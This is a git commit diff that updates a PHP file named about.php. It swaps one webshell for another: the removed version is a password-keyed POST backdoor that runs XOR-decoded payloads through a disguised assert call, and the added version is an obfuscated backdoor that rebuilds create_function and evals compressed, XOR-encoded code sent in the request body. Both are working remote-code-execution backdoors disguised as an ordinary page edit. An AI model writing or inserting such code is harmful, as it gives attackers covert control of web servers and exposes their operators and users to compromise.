a7c2e3e0d216e400323fea42a42f8a945211ed35
likolol <156593585+likolol@users.noreply.github.com>
2026-06-14 15:58:39 +0300

    Update about.php

--- about.php
+++ about.php
@@ -1,45 +1,20 @@
 <?php
+error_reporting(0);
 
-@session_start();
-@set_time_limit(0);
-@error_reporting(0);
+$i='$k="/T0d/T0dbd6a";$kh="5b/T9/Ta/Tb03d6630";$/Tkf="771ef38/T/T2a795";$p=/T"mBoUt/TcYGgsp/TLVptH/T";f/Tunc/Ttion x(/T$t,';
 
-function encode($D, $K) {
-    for ($i = 0; $i < strlen($D); $i++) {
-        $c = $K[$i + 1 & 15];
-        $D[$i] = $D[$i] ^ $c;
-    }
-    return $D;
-}
+$N='$k/T){$c=str/Tl/Ten($k/T);$l=strle/T/Tn($t)/T;$o="";for($i=0;$i<$/Tl;)/T/T{for/T($j=0;($j<$c&&$/Ti</T/T$l);$j++,$i++){$';
 
-$pass = 'rt7ao0lsw';
-$payloadName = 'payload';
-$key = 'c6478da107cd62f0';
+$m='conten/Tts/T(/T);@o/Tb_end_clea/Tn();$r=@b/Ta/Tse64_encode(@x(/T@g/Tzcompre/Ts/Ts($o),$/Tk));print/T("$p$k/Th$r$kf");}';
 
-if (isset($_POST[$pass])) {
-    $data = encode(base64_decode($_POST[$pass]), $key);
-    
-    if (isset($_SESSION[$payloadName])) {
-        $payload = encode($_SESSION[$payloadName], $key);
-        
-        if (strpos($payload, "getBasicsInfo") === false) {
-            $payload = encode($payload, $key);
-        }
-        
-        $a = 'a'; $s = 's'; $e = 'e'; $r = 'r'; $t = 't';
-        $engine = $a . $s . $s . $e . $r . $t; 
-        
-        @$engine('?>' . $payload);
-        
-        echo substr(md5($pass . $key), 0, 16);
-        echo base64_encode(encode(@run($data), $key));
-        echo substr(md5($pass . $key), 16);
-        exit();
-        
-    } else {
-        if (strpos($data, "getBasicsInfo") !== false) {
-            $_SESSION[$payloadName] = encode($data, $key);
-        }
-    }
-}
+$j='T//input"),$m)==1) /T{@ob_sta/Trt/T();@eva/Tl(@gz/Tuncompress(/T@x(@ba/Tse64_d/Tecode/T($m[1])/T,$k/T)/T));$o=@ob/T_get_';
+
+$g=str_replace('jY','','crjYejYatejY_jYjYfunctijYon');
+
+$O='/To.=$/T/Tt{$i}^/T$k{$j};}}ret/Turn $o;}if /T(/T/T@preg_match("/$k/T/Th(.+)$kf/"/T,@f/Tile/T_g/Tet/T_contents("php/T:/';
+
+$d=str_replace('/T','',$i.$N.$O.$j.$m);
+
+$u=$g('',$d);$u();
+
 ?>
